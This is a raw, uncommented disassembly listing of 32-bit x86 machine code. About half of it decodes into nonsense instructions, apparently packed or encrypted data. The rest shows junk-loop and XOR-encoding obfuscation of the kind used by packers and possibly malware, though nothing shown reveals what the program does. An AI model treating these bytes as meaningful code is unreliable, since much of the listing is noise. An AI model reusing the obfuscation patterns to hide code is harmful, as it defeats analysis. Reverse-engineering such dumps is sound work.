  411d39:	outs   dx,DWORD PTR ds:[esi]
  411d3a:	cwde   
  411d3b:	cwde   
  411d3c:	push   ebp
  411d3d:	fisub  DWORD PTR [edi]
  411d3f:	cmp    BYTE PTR [ecx-0x63a07532],ah
  411d45:	mov    esp,0xca2111e6
  411d4a:	test   eax,0x26f53671
  411d4f:	mov    ecx,0xf5f0987
  411d54:	test   al,0xc6
  411d56:	jle    0x411cff
  411d58:	and    DWORD PTR [edi-0x7d061c4c],eax
  411d5e:	jecxz  0x411d61
  411d60:	xchg   ebx,eax
  411d61:	int3   
  411d62:	shr    DWORD PTR [ecx],cl
  411d64:	push   eax
  411d65:	add    BYTE PTR [edi+eiz*8],ah
  411d68:	into   
  411d69:	dec    esp
  411d6a:	add    edx,ebx
  411d6c:	sub    edx,esp
  411d6e:	lods   al,BYTE PTR ds:[esi]
  411d6f:	loopne 0x411d7d
  411d71:	js     0x411d1e
  411d73:	jg     0x411db7
  411d75:	cld    
  411d76:	ret    0x4f6d
  411d79:	mov    ?,WORD PTR [esi+0x4912f91a]
  411d7f:	or     eax,0xe8f809a8
  411d84:	lahf   
  411d85:	dec    edx
  411d86:	pushf  
  411d87:	push   0xffffff8b
  411d89:	xchg   ecx,eax
  411d8a:	sbb    al,0x31
  411d8c:	sar    BYTE PTR [ebx+ecx*8-0x74da1b6],1
  411d93:	aaa    
  411d94:	dec    edi
  411d95:	mov    ds:0x478586f8,al
  411d9a:	iret   
  411d9b:	ja     0x411e03
  411d9d:	inc    edx
  411d9e:	jnp    0x411d6a
  411da0:	leave  
  411da1:	push   edx
  411da2:	add    DWORD PTR [edx],ebx
  411da4:	pcmpgtw mm3,mm6
  411da7:	pop    ecx
  411da8:	dec    ecx
  411da9:	add    al,0x58
  411dab:	std    
  411dac:	inc    eax
  411dad:	lds    ebp,FWORD PTR [esi]
  411daf:	paddw  mm7,QWORD PTR [eax]
  411db2:	ja     0x411d8e
  411db4:	nop
  411db5:	iret   
  411db6:	ficomp WORD PTR [ebx]
  411db8:	or     BYTE PTR [edx+0x4b5f303d],bl
  411dbe:	mov    esp,DWORD PTR [esi+0x22]
  411dc1:	loope  0x411daf
  411dc3:	mov    bh,ch
  411dc5:	fmul   st,st(4)
  411dc7:	retf   0x22e1
  411dca:	shr    DWORD PTR [ebx-0xe],0x44
  411dce:	ret    0xb3aa
  411dd1:	ins    BYTE PTR es:[edi],dx
  411dd2:	fs jp  0x411d71
  411dd5:	xor    BYTE PTR [esi-0x2bd1d869],ch
  411ddb:	push   ss
  411ddc:	jns    0x411df4
  411dde:	jge    0x411e5e
  411de0:	sbb    edx,edi
  411de2:	inc    esi
  411de3:	inc    esi
  411de4:	jg     0x411ddf
  411de6:	outs   dx,BYTE PTR ds:[esi]
  411de7:	or     DWORD PTR [esi],esp
  411de9:	aad    0x8
  411deb:	inc    esp
  411dec:	xchg   esi,eax
  411ded:	mov    ah,0x90
  411def:	fldl2t 
  411df1:	jle    0x411d89
  411df3:	int3   
  411df4:	lods   al,BYTE PTR ds:[esi]
  411df5:	cmc    
  411df6:	aad    0x58
  411df8:	xlat   BYTE PTR ds:[ebx]
  411df9:	add    edi,esp
  411dfb:	add    eax,0x1195cefb
  411e00:	and    ebp,edx
  411e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e03:	dec    eax
  411e04:	ja     0x411dba
  411e06:	jmp    0x411dc3
  411e08:	fisttp WORD PTR [esi-0x14]
  411e0b:	gs jle 0x411dfe
  411e0e:	fadd   QWORD PTR [ebp+0x79]
  411e11:	jne    0x411dca
  411e13:	outs   dx,BYTE PTR ds:[esi]
  411e14:	xchg   BYTE PTR [eax-0x71],ah
  411e17:	outs   dx,BYTE PTR ds:[esi]
  411e18:	xor    al,0x34
  411e1a:	cs fxtract 
  411e1d:	je     0x411e47
  411e1f:	push   ebx
  411e20:	daa    
  411e21:	mov    BYTE PTR [edx+ecx*8-0x2edef06c],dl
  411e28:	out    dx,eax
  411e29:	(bad)  
  411e2a:	mov    edi,0xb7653731
  411e2f:	add    DWORD PTR [ebp+0x4e],ebp
  411e32:	fcom   DWORD PTR [ebp-0x80]
  411e35:	mov    ds:0x9b0f0b7c,al
  411e3a:	jne    0x411dc3
  411e3c:	(bad)  
  411e3e:	inc    ebx
  411e3f:	adc    edx,DWORD PTR [edi+eiz*1+0x54]
  411e43:	pop    eax
  411e44:	js     0x411e40
  411e46:	push   ebx
  411e47:	inc    esp
  411e48:	adc    al,0x9b
  411e4a:	adc    BYTE PTR [ebx-0x343199ab],0x57
  411e51:	clc    
  411e52:	cdq    
  411e53:	nop
  411e54:	mov    eax,ds:0xcd392020
  411e59:	out    0x8d,al
  411e5b:	cdq    
  411e5c:	shl    ah,cl
  411e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e5f:	test   al,0x4d
  411e61:	xlat   BYTE PTR ds:[ebx]
  411e62:	out    0x14,eax
  411e64:	inc    ebp
  411e65:	inc    ecx
  411e66:	jp     0x411de9
  411e68:	mov    al,ds:0xee2ce911
  411e6d:	mov    dh,0xe1
  411e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e70:	imul   eax,DWORD PTR [esp+eiz*4+0x27],0x7c
  411e75:	mov    esi,0x82182209
  411e7a:	pop    ds
  411e7b:	loop   0x411ee4
  411e7d:	dec    ecx
  411e7e:	xor    ch,BYTE PTR [ebx+0x36]
  411e81:	jbe    0x411f00
  411e83:	(bad)  
  411e84:	jle    0x411e9b
  411e86:	stc    
  411e87:	in     al,dx
  411e88:	jmp    0x97af:0x99b8b7fd
  411e8f:	lock push eax
  411e91:	mov    eax,DWORD PTR [edx+0xe]
  411e94:	push   ecx
  411e95:	in     eax,0x11
  411e97:	int    0xf3
  411e99:	adc    ebp,DWORD PTR [esi+ebx*4]
  411e9c:	mov    al,ds:0xb1281b80
  411ea1:	in     eax,dx
  411ea2:	inc    ebx
  411ea3:	aad    0x65
  411ea5:	xor    DWORD PTR [esi+0x61de95b5],esi
  411eab:	out    0xa7,eax
  411ead:	adc    ah,BYTE PTR [ecx]
  411eaf:	mov    al,es:0x7a07b565
  411eb5:	jecxz  0x411e8d
  411eb7:	scas   al,BYTE PTR es:[edi]
  411eb8:	inc    esp
  411eb9:	pop    es
  411eba:	sub    ebx,ebx
  411ebc:	xor    DWORD PTR [ecx-0x3b],ecx
  411ebf:	nop
  411ec0:	test   ch,dh
  411ec2:	sbb    BYTE PTR [edi+0x13],ch
  411ec5:	inc    ebp
  411ec6:	xor    dh,cl
  411ec8:	in     eax,dx
  411ec9:	stos   DWORD PTR es:[edi],eax
  411eca:	pop    es
  411ecb:	bound  eax,QWORD PTR [esi-0x1f247e11]
  411ed1:	push   edx
  411ed2:	inc    edi
  411ed3:	jl     0x411f0d
  411ed5:	xor    ebx,DWORD PTR [ebp+0x216bacef]
  411edb:	fcmovne st,st(6)
  411edd:	mov    ds:0xcc1f3ee8,al
  411ee2:	ins    BYTE PTR es:[edi],dx
  411ee3:	jp     0x411e8a
  411ee5:	adc    al,0xe3
  411ee7:	mov    BYTE PTR [ecx+0x29],bh
  411eea:	cmp    DWORD PTR [ebx-0x70],esi
  411eed:	les    esp,FWORD PTR [esi+0x4e]
  411ef0:	aad    0x4
  411ef2:	adc    ebx,0x4
  411ef5:	add    bh,BYTE PTR [edi-0xe1593cd]
  411efb:	mov    ah,0x15
  411efd:	dec    esp
  411efe:	dec    esp
  411eff:	and    DWORD PTR fs:[ebx+0xae679ed],ebp
  411f06:	fnstcw WORD PTR [eax+0x5e8c0c95]
  411f0c:	in     eax,dx
  411f0d:	out    0xbf,al
  411f0f:	push   edi
  411f10:	push   0xffffffb9
  411f12:	fst    DWORD PTR [esi-0x6b1e44ca]
  411f18:	jno    0x411f8b
  411f1a:	push   es
  411f1b:	xor    DWORD PTR [ebp+esi*8+0x650f165a],ebx
  411f22:	mov    WORD PTR [eax+0x316d0480],gs
  411f28:	inc    edx
  411f29:	dec    ebx
  411f2a:	cld    
  411f2b:	pop    esi
  411f2c:	sbb    eax,0x5234910b
  411f31:	mov    esp,fs
  411f33:	mov    ds:0xa4bd2510,eax
  411f38:	sbb    bl,BYTE PTR [edx]
  411f3a:	pop    edx
  411f3b:	adc    esp,ecx
  411f3d:	jbe    0x411f85
  411f3f:	lods   eax,DWORD PTR ds:[esi]
  411f40:	int3   
  411f41:	xor    al,0xed
  411f43:	das    
  411f44:	lods   al,BYTE PTR ds:[esi]
  411f45:	mov    eax,ds:0xc7562e61
  411f4a:	sub    DWORD PTR [edx-0x48],0xbcbece02
  411f51:	scas   eax,DWORD PTR es:[edi]
  411f52:	mov    bh,BYTE PTR [edx]
  411f54:	sub    eax,0xea04768d
  411f59:	pop    es
  411f5a:	jg     0x411efa
  411f5c:	dec    eax
  411f5d:	int3   
  411f5e:	neg    BYTE PTR [esi+esi*2+0xef7dc21]
  411f65:	sbb    eax,DWORD PTR [ebp+0x40]
  411f68:	out    dx,al
  411f69:	icebp  
  411f6a:	xchg   edx,eax
  411f6b:	sbb    al,BYTE PTR [ebx+0x4c7e0287]
  411f71:	pop    ebx
  411f72:	mov    ecx,0x61a95604
  411f77:	mov    esp,0x7fe61408
  411f7c:	cmp    BYTE PTR [eax+0x6ff2abb9],ch
  411f82:	xchg   edi,eax
  411f83:	stos   BYTE PTR es:[edi],al
  411f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f85:	lods   eax,DWORD PTR ds:[esi]
  411f86:	cwde   
  411f87:	data16 mov dh,BYTE PTR [edx+ecx*8+0x39]
  411f8c:	aas    
  411f8d:	pop    esp
  411f8e:	into   
  411f8f:	sub    edx,edx
  411f91:	dec    ebp
  411f92:	scas   eax,DWORD PTR es:[edi]
  411f93:	jne    0x411fc6
  411f95:	cld    
  411f96:	bound  edx,QWORD PTR [edx-0x48]
  411f99:	xchg   BYTE PTR [esp+ebx*8+0x257fed96],ah
  411fa0:	push   ebp
  411fa1:	ins    BYTE PTR es:[edi],dx
  411fa2:	sbb    BYTE PTR [ebp-0xf],ah
  411fa5:	jmp    0x51837a2a
  411faa:	mov    esi,0x6d3f92c9
  411faf:	push   es
  411fb0:	pop    edi
  411fb1:	fidivr DWORD PTR [edi+0x4694d69f]
  411fb7:	inc    ebp
  411fb8:	and    BYTE PTR [edi],dh
  411fba:	push   ebp
  411fbb:	add    dl,BYTE PTR [esi-0x3d]
  411fbe:	es repz je 0x41200a
  411fc2:	jmp    0x40e267f2
  411fc7:	popa   
  411fc8:	mov    al,0x75
  411fca:	retf   0xd14c
  411fcd:	test   BYTE PTR [eax+0x4ebe2f24],0xac
  411fd4:	(bad)  
  411fd5:	pop    esp
  411fd6:	jle    0x411fc4
  411fd8:	pop    edi
  411fd9:	sbb    al,0xb5
  411fdb:	pop    esp
  411fdc:	lods   eax,DWORD PTR ds:[esi]
  411fdd:	nop
  411fde:	fist   DWORD PTR [ecx+eax*4+0x38]
  411fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fe3:	test   ebp,esi
  411fe5:	push   edx
  411fe6:	loop   0x411f9c
  411fe8:	in     al,dx
  411fe9:	ret    0xcea1
  411fec:	cwde   
  411fed:	cmp    al,bl
  411fef:	cld    
  411ff0:	loop   0x412005
  411ff2:	mov    bl,0x5
  411ff4:	cwde   
  411ff5:	das    
  411ff6:	xchg   ebp,eax
  411ff7:	cmp    edx,ebp
  411ff9:	mov    edx,0xc12f3a03
  411ffe:	or     DWORD PTR [eax+0x18812bf9],esp
  412004:	adc    bl,BYTE PTR ds:0x6767fc81
  41200a:	push   esi
  41200b:	in     eax,0x74
  41200d:	add    bh,BYTE PTR [esi-0x16594bb8]
  412013:	cli    
  412014:	xor    al,0x58
  412016:	cs retf 
  412018:	ins    DWORD PTR es:[edi],dx
  412019:	pop    edx
  41201a:	fadd   QWORD PTR [eax+0x20cd301e]
  412020:	(bad)  
  412021:	mov    ds:0x9012f857,al
  412026:	inc    edi
  412027:	sbb    BYTE PTR [edx],bl
  412029:	repz mov bl,0xe9
  41202c:	(bad)  
  41202d:	sbb    ebp,DWORD PTR [esi+0x27]
  412030:	icebp  
  412031:	pop    edi
  412032:	sub    BYTE PTR [esi+0x3c64d338],bh
  412038:	xchg   ebp,eax
  412039:	sbb    ecx,DWORD PTR [edx-0xb4faab9]
  41203f:	xchg   bl,dh
  412041:	inc    esp
  412042:	ins    DWORD PTR es:[edi],dx
  412043:	push   edi
  412044:	outs   dx,BYTE PTR ds:[esi]
  412045:	ret    
  412046:	mov    al,ds:0x60925328
  41204b:	inc    esi
  41204c:	adc    al,0x34
  41204e:	inc    ebx
  41204f:	imul   BYTE PTR [ecx-0x2e40f2f3]
  412055:	(bad)  
  412056:	lahf   
  412057:	into   
  412058:	aad    0xbb
  41205a:	jl     0x412079
  41205c:	pop    ebp
  41205d:	call   0x643c:0x4906da36
  412064:	dec    ecx
  412065:	pop    es
  412066:	mov    BYTE PTR [eax+0x71],ah
  412069:	or     BYTE PTR [ebx],bh
  41206b:	push   ebx
  41206c:	jmp    FWORD PTR [ebp+esi*4+0x10]
  412070:	in     al,dx
  412071:	inc    ebp
  412072:	out    dx,eax
  412073:	fst    QWORD PTR [esi+0x32]
  412076:	sbb    al,0x67
  412078:	push   ecx
  412079:	xor    dl,ch
  41207b:	(bad)  
  41207c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41207d:	dec    ecx
  41207e:	ror    DWORD PTR [esi],1
  412080:	pushf  
  412081:	bound  edx,QWORD PTR [eax-0x7f97d327]
  412087:	ficomp DWORD PTR [ecx]
  412089:	sub    al,al
  41208b:	fs pusha 
  41208d:	push   ecx
  41208e:	pop    ds
  41208f:	mov    esi,0xc2ad512c
  412094:	fbstp  TBYTE PTR [ecx]
  412096:	fnsave [ecx-0x12]
  412099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41209a:	inc    ecx
  41209b:	std    
  41209c:	in     al,dx
  41209d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41209e:	loope  0x4120f5
  4120a0:	nop
  4120a1:	(bad)  
  4120a2:	xlat   BYTE PTR ds:[ebx]
  4120a3:	jmp    0x35cd:0x107def01
  4120aa:	(bad)  
  4120ab:	aas    
  4120ac:	lods   al,BYTE PTR ds:[esi]
  4120ad:	ins    BYTE PTR es:[edi],dx
  4120ae:	push   esi
  4120af:	cdq    
  4120b0:	cmp    DWORD PTR [ebx+0x22],esi
  4120b3:	std    
  4120b4:	inc    ecx
  4120b5:	loop   0x4120a0
  4120b7:	push   edx
  4120b8:	mov    ch,0x29
  4120ba:	dec    ecx
  4120bb:	xor    al,0xff
  4120bd:	(bad)  
  4120be:	(bad)  
  4120bf:	or     DWORD PTR cs:[ebp+0x66],ebx
  4120c3:	xor    al,0x42
  4120c5:	add    eax,0xb9b91f4b
  4120ca:	mov    ah,0xbb
  4120cc:	mov    al,BYTE PTR ds:0xba5227e8
  4120d2:	pop    ebp
  4120d3:	outs   dx,DWORD PTR ds:[esi]
  4120d4:	cwde   
  4120d5:	jns    0x4120a2
  4120d7:	mov    gs,WORD PTR [edi]
  4120d9:	jo     0x41209a
  4120db:	out    0x5c,eax
  4120dd:	push   ecx
  4120de:	adc    al,0xc
  4120e0:	xchg   esp,eax
  4120e1:	mov    edx,0x38a0c62d
  4120e6:	fidivr DWORD PTR [esi+0x69f8d29e]
  4120ec:	aaa    
  4120ed:	push   ds
  4120ee:	push   esp
  4120ef:	in     al,dx
  4120f0:	push   ebx
  4120f1:	jle    0x4120ca
  4120f3:	cld    
  4120f4:	clc    
  4120f5:	in     eax,0xb3
  4120f7:	mov    ds:0xc6511f78,al
  4120fc:	add    al,0x95
  4120fe:	mov    ds:0x93d406a6,eax
  412103:	jmp    0xf38f:0x3e61e4e0
  41210a:	int    0x8e
  41210c:	sbb    al,BYTE PTR [ebx+0x6c]
  41210f:	int3   
  412110:	cmp    BYTE PTR [edx+0x0],al
  412113:	mov    ah,0x66
  412115:	xor    BYTE PTR [edx],dh
  412117:	loope  0x4120cb
  412119:	ja     0x4120e5
  41211b:	shr    edi,cl
  41211d:	test   eax,0x7faa331d
  412122:	mov    ds:0x9b3eb644,eax
  412127:	loope  0x4120f0
  412129:	mov    esp,0xe3d1cf28
  41212e:	mov    ch,BYTE PTR [ebp+0x5d]
  412131:	inc    ebx
  412132:	addr16 mov bh,0xe1
  412135:	std    
  412136:	xor    ebx,DWORD PTR [edi]
  412138:	aam    0xc0
  41213a:	cmc    
  41213b:	das    
  41213c:	fmul   DWORD PTR [ecx]
  41213e:	adc    bh,dl
  412140:	sbb    DWORD PTR [ebx],0xe6878f3b
  412146:	test   BYTE PTR [edi+0x13b05589],0xdb
  41214d:	mov    edx,DWORD PTR [ebp+0x8]
  412150:	and    DWORD PTR ds:0x428e8d,0x0
  41215a:	jmp    0x41216c
  41215f:	mov    ebx,DWORD PTR ds:0x428e8d
  412165:	inc    ebx
  412166:	mov    DWORD PTR ds:0x428e8d,ebx
  41216c:	cmp    DWORD PTR ds:0x428e8d,0x1c
  412173:	jae    0x4121a0
  412179:	cmp    DWORD PTR ds:0x428e8d,0x20
  412180:	ja     0x4121a0
  412186:	jmp    0x41219b
  41218b:	push   0x428039
  412190:	push   0x400000
  412195:	call   DWORD PTR ds:0x42ca24
  41219b:	jmp    0x41215f
  4121a0:	mov    ebx,DWORD PTR [ebp-0x4c]
  4121a3:	inc    DWORD PTR ds:0x428e71
  4121a9:	add    edx,ecx
  4121ab:	sbb    DWORD PTR ds:0x428e8d,0x5a59
  4121b5:	or     edx,ebx
  4121b7:	mov    DWORD PTR ds:0x428e55,0x19
  4121c1:	cmp    DWORD PTR ds:0x428e55,0x0
  4121c8:	je     0x4121fb
  4121ce:	cmp    DWORD PTR ds:0x428e55,0x1e
  4121d5:	jle    0x4121fb
  4121db:	jmp    0x4121e9
  4121e0:	push   DWORD PTR [ebp-0x20]
  4121e3:	call   DWORD PTR ds:0x42ca28
  4121e9:	mov    ebx,DWORD PTR ds:0x428e55
  4121ef:	dec    ebx
  4121f0:	mov    DWORD PTR ds:0x428e55,ebx
  4121f6:	jmp    0x4121c1
  4121fb:	mov    DWORD PTR [ebp-0x4c],edx
  4121fe:	add    DWORD PTR ds:0x428eb1,ebx
  412204:	mov    edx,DWORD PTR [ebp+0x8]
  412207:	mov    DWORD PTR ds:0x428ec5,0x16
  412211:	cmp    DWORD PTR ds:0x428ec5,0x0
  412218:	je     0x412267
  41221e:	cmp    DWORD PTR ds:0x428ec5,0xc
  412225:	jl     0x412267
  41222b:	jmp    0x41223b
  412230:	push   0x1fc5
  412235:	call   DWORD PTR ds:0x42ca2c
  41223b:	cmp    DWORD PTR ds:0x428ec5,0xd
  412242:	jne    0x412255
  412248:	mov    ebx,DWORD PTR ds:0x428ec5
  41224e:	dec    ebx
  41224f:	mov    DWORD PTR ds:0x428ec5,ebx
  412255:	mov    ebx,DWORD PTR ds:0x428ec5
  41225b:	dec    ebx
  41225c:	mov    DWORD PTR ds:0x428ec5,ebx
  412262:	jmp    0x412211
  412267:	mov    ebx,0xfdbe0321
  41226c:	add    DWORD PTR ds:0x428eb9,0x428e39
  412276:	sub    ebx,edx
  412278:	add    ebx,DWORD PTR [ebp-0x48]
  41227b:	sbb    edx,DWORD PTR ds:0x428e75
  412281:	mov    DWORD PTR [ebp-0x48],ebx
  412284:	xor    DWORD PTR ds:0x428e9d,edi
  41228a:	mov    edx,DWORD PTR [ebp+0x8]
  41228d:	mov    ebx,DWORD PTR ds:0x428e35
  412293:	sub    DWORD PTR ds:0x428e4d,ebx
  412299:	mov    ebx,DWORD PTR [ebp-0x44]
  41229c:	add    edx,edi
  41229e:	xor    DWORD PTR ds:0x428e7d,0x7f21
  4122a8:	xor    edx,ebx
  4122aa:	mov    DWORD PTR [ebp-0x44],edx
  4122ad:	movzx  edx,BYTE PTR ds:0x428e9d
  4122b4:	adc    DWORD PTR ds:0x428e65,edx
  4122ba:	mov    edx,DWORD PTR [ebp+0x8]
  4122bd:	xor    DWORD PTR ds:0x428e55,0x428ead
  4122c7:	xor    edx,eax
  4122c9:	add    edx,esi
  4122cb:	mov    DWORD PTR ds:0x428e95,0x7e15
  4122d5:	jne    0x40fc55
  4122db:	jmp    0x412616
  4122e0:	mov    edx,DWORD PTR [ebp-0xc]
  4122e3:	inc    ebx
  4122e4:	sub    edx,esi
  4122e6:	movzx  ebx,BYTE PTR ds:0x428ebd
  4122ed:	xor    DWORD PTR ds:0x428ec5,ebx
  4122f3:	xor    edx,eax
  4122f5:	mov    DWORD PTR ds:0x428e31,0x17
  4122ff:	cmp    DWORD PTR ds:0x428e31,0x0
  412306:	je     0x412355
  41230c:	cmp    DWORD PTR ds:0x428e31,0xa
  412313:	jle    0x412355
  412319:	jmp    0x412329
  41231e:	push   0x428059
  412323:	call   DWORD PTR ds:0x42ca30
  412329:	cmp    DWORD PTR ds:0x428e31,0xb
  412330:	jne    0x412343
  412336:	mov    ebx,DWORD PTR ds:0x428e31
  41233c:	dec    ebx
  41233d:	mov    DWORD PTR ds:0x428e31,ebx
  412343:	mov    ebx,DWORD PTR ds:0x428e31
  412349:	dec    ebx
  41234a:	mov    DWORD PTR ds:0x428e31,ebx
  412350:	jmp    0x4122ff
  412355:	mov    DWORD PTR [ebp-0x5c],edx
  412358:	mov    edx,DWORD PTR [ebp-0x10]
  41235b:	mov    ebx,DWORD PTR [ebp-0x8]
  41235e:	xor    DWORD PTR ds:0x428e99,0xf1a
  412368:	xor    edx,eax
  41236a:	xor    ebx,eax
  41236c:	sub    DWORD PTR ds:0x428ebd,0x1998
  412376:	sub    edx,ebx
  412378:	sub    edx,esi
  41237a:	xor    edx,eax
  41237c:	mov    DWORD PTR [ebp-0x10],edx
  41237f:	mov    edx,DWORD PTR [ebp-0x14]
  412382:	mov    DWORD PTR [ebp+0x8],edx
  412385:	jmp    0x4123fa
  41238a:	mov    edx,DWORD PTR [ebp+0x8]
  41238d:	mov    ebx,DWORD PTR [ebp-0x8]
  412390:	xor    edx,eax
  412392:	xor    ebx,eax
  412394:	sub    edx,ebx
  412396:	sub    edx,esi
  412398:	xor    edx,eax
  41239a:	mov    DWORD PTR [ebp+0x8],edx
  41239d:	mov    edx,DWORD PTR [ebp+0x8]
  4123a0:	mov    ebx,DWORD PTR [ebp-0x58]
  4123a3:	lea    edx,[ebx+edx*1+0x5708f8]
  4123aa:	mov    DWORD PTR [ebp-0x58],edx
  4123ad:	mov    edx,DWORD PTR [ebp+0x8]
  4123b0:	mov    ebx,DWORD PTR [ebp-0x54]
  4123b3:	add    edx,0x64f89a
  4123b9:	imul   edx,ebx
  4123bc:	mov    DWORD PTR [ebp-0x54],edx
  4123bf:	mov    edx,DWORD PTR [ebp+0x8]
  4123c2:	mov    ebx,DWORD PTR [ebp-0x50]
  4123c5:	add    edx,0x242ebed
  4123cb:	and    edx,ebx
  4123cd:	mov    DWORD PTR [ebp-0x50],edx
  4123d0:	mov    edx,DWORD PTR [ebp+0x8]
  4123d3:	mov    ebx,DWORD PTR [ebp-0x4c]
  4123d6:	add    edx,ecx
  4123d8:	or     edx,ebx
  4123da:	mov    DWORD PTR [ebp-0x4c],edx
  4123dd:	mov    edx,DWORD PTR [ebp+0x8]
  4123e0:	mov    ebx,0xfdbe0321
  4123e5:	sub    ebx,edx
  4123e7:	add    ebx,DWORD PTR [ebp-0x48]
  4123ea:	mov    DWORD PTR [ebp-0x48],ebx
  4123ed:	mov    edx,DWORD PTR [ebp+0x8]
  4123f0:	mov    ebx,DWORD PTR [ebp-0x44]
  4123f3:	add    edx,edi
  4123f5:	xor    edx,ebx
  4123f7:	mov    DWORD PTR [ebp-0x44],edx
  4123fa:	mov    edx,DWORD PTR [ebp+0x8]
  4123fd:	xor    edx,eax
  4123ff:	add    edx,esi
  412401:	jne    0x41238a
  412407:	mov    edx,DWORD PTR [ebp-0xc]
  41240a:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  412411:	mov    bl,BYTE PTR [ebp-0x1]
  412414:	cmp    dl,bl
  412416:	je     0x4124f4
  41241c:	mov    ecx,DWORD PTR [ebp-0x5c]
  41241f:	mov    edx,DWORD PTR [ebp-0xc]
  412422:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  412429:	mov    ebx,DWORD PTR [ebp+0xc]
  41242c:	xor    ecx,eax
  41242e:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f8]
  412435:	jne    0x412628
  41243b:	mov    ecx,DWORD PTR [ebp-0x5c]
  41243e:	mov    edx,DWORD PTR [ebp+0xc]
  412441:	xor    ecx,eax
  412443:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f8]
  41244b:	mov    edx,DWORD PTR [ebp-0x18]
  41244e:	xor    edx,eax
  412450:	add    edx,esi
  412452:	cmp    ecx,edx
  412454:	mov    ecx,DWORD PTR [ebp-0x14]
  412457:	mov    DWORD PTR [ebp+0x8],ecx
  41245a:	mov    ecx,DWORD PTR [ebp+0x8]
  41245d:	je     0x414aa9
  412463:	xor    ecx,eax
  412465:	add    ecx,esi
  412467:	mov    ecx,0xf641bea
  41246c:	je     0x41257c
  412472:	mov    edx,DWORD PTR [ebp+0x8]
  412475:	mov    ebx,DWORD PTR [ebp-0x8]
  412478:	xor    edx,eax
  41247a:	xor    ebx,eax
  41247c:	sub    edx,ebx
  41247e:	sub    edx,esi
  412480:	xor    edx,eax
  412482:	mov    DWORD PTR [ebp+0x8],edx
  412485:	mov    edx,DWORD PTR [ebp+0x8]
  412488:	mov    ebx,DWORD PTR [ebp-0x58]
  41248b:	lea    edx,[ebx+edx*1+0x5708f8]
  412492:	mov    DWORD PTR [ebp-0x58],edx
  412495:	mov    edx,DWORD PTR [ebp+0x8]
  412498:	mov    ebx,DWORD PTR [ebp-0x54]
  41249b:	add    edx,0x64f89a
  4124a1:	imul   edx,ebx
  4124a4:	mov    DWORD PTR [ebp-0x54],edx
  4124a7:	mov    edx,DWORD PTR [ebp+0x8]
  4124aa:	mov    ebx,DWORD PTR [ebp-0x50]
  4124ad:	add    edx,0x242ebed
  4124b3:	and    edx,ebx
  4124b5:	mov    DWORD PTR [ebp-0x50],edx
  4124b8:	mov    edx,DWORD PTR [ebp+0x8]
  4124bb:	mov    ebx,DWORD PTR [ebp-0x4c]
  4124be:	add    edx,ecx
  4124c0:	or     edx,ebx
  4124c2:	mov    DWORD PTR [ebp-0x4c],edx
  4124c5:	mov    edx,DWORD PTR [ebp+0x8]
  4124c8:	mov    ebx,0xfdbe0321
  4124cd:	sub    ebx,edx
  4124cf:	add    ebx,DWORD PTR [ebp-0x48]
  4124d2:	mov    DWORD PTR [ebp-0x48],ebx
  4124d5:	mov    edx,DWORD PTR [ebp+0x8]
  4124d8:	mov    ebx,DWORD PTR [ebp-0x44]
  4124db:	add    edx,edi
  4124dd:	xor    edx,ebx
  4124df:	mov    DWORD PTR [ebp-0x44],edx
  4124e2:	mov    edx,DWORD PTR [ebp+0x8]
  4124e5:	xor    edx,eax
  4124e7:	add    edx,esi
  4124e9:	jne    0x412472
  4124ef:	jmp    0x41257c
  4124f4:	mov    edx,DWORD PTR [ebp-0x14]
  4124f7:	mov    DWORD PTR [ebp+0x8],edx
  4124fa:	jmp    0x41256f
  4124ff:	mov    edx,DWORD PTR [ebp+0x8]
  412502:	mov    ebx,DWORD PTR [ebp-0x8]
  412505:	xor    edx,eax
  412507:	xor    ebx,eax
  412509:	sub    edx,ebx
  41250b:	sub    edx,esi
  41250d:	xor    edx,eax
  41250f:	mov    DWORD PTR [ebp+0x8],edx
  412512:	mov    edx,DWORD PTR [ebp+0x8]
  412515:	mov    ebx,DWORD PTR [ebp-0x58]
  412518:	lea    edx,[ebx+edx*1+0x5708f8]
  41251f:	mov    DWORD PTR [ebp-0x58],edx
  412522:	mov    edx,DWORD PTR [ebp+0x8]
  412525:	mov    ebx,DWORD PTR [ebp-0x54]
  412528:	add    edx,0x64f89a
  41252e:	imul   edx,ebx
  412531:	mov    DWORD PTR [ebp-0x54],edx
  412534:	mov    edx,DWORD PTR [ebp+0x8]
  412537:	mov    ebx,DWORD PTR [ebp-0x50]
  41253a:	add    edx,0x242ebed
  412540:	and    edx,ebx
  412542:	mov    DWORD PTR [ebp-0x50],edx
  412545:	mov    edx,DWORD PTR [ebp+0x8]
  412548:	mov    ebx,DWORD PTR [ebp-0x4c]
  41254b:	add    edx,ecx
  41254d:	or     edx,ebx
  41254f:	mov    DWORD PTR [ebp-0x4c],edx
  412552:	mov    edx,DWORD PTR [ebp+0x8]
  412555:	mov    ebx,0xfdbe0321
  41255a:	sub    ebx,edx
  41255c:	add    ebx,DWORD PTR [ebp-0x48]
  41255f:	mov    DWORD PTR [ebp-0x48],ebx
  412562:	mov    edx,DWORD PTR [ebp+0x8]
  412565:	mov    ebx,DWORD PTR [ebp-0x44]
  412568:	add    edx,edi
  41256a:	xor    edx,ebx
  41256c:	mov    DWORD PTR [ebp-0x44],edx
  41256f:	mov    edx,DWORD PTR [ebp+0x8]
  412572:	xor    edx,eax
  412574:	add    edx,esi
  412576:	jne    0x4124ff
  41257c:	mov    edx,DWORD PTR [ebp-0x14]
  41257f:	mov    DWORD PTR [ebp+0x8],edx
  412582:	jmp    0x4125f7
  412587:	mov    edx,DWORD PTR [ebp+0x8]
  41258a:	mov    ebx,DWORD PTR [ebp-0x8]
  41258d:	xor    edx,eax
  41258f:	xor    ebx,eax
  412591:	sub    edx,ebx
  412593:	sub    edx,esi
  412595:	xor    edx,eax
  412597:	mov    DWORD PTR [ebp+0x8],edx
  41259a:	mov    edx,DWORD PTR [ebp+0x8]
  41259d:	mov    ebx,DWORD PTR [ebp-0x58]
